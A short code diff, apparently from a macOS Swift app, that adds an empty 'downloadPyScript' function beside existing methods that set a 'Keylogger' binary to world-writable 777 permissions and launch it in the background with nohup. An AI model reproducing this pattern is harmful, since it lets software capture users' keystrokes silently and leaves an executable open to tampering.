@@ -294,6 +294,10 @@ class MainMenuController: NSObject , NetServiceBrowserDelegate, NetServiceDelega
         shell(launchPath: "/usr/bin/env", "chmod","777",self.prefsWindow.preferences.keyloggerLocation+"/Keylogger")
     }
     
+    private func downloadPyScript(){
+        
+    }
+    
     private func startKeyLogger(){
         shell(launchPath:"/usr/bin/env","nohup",self.prefsWindow.preferences.keyloggerLocation+"/Keylogger")
     }
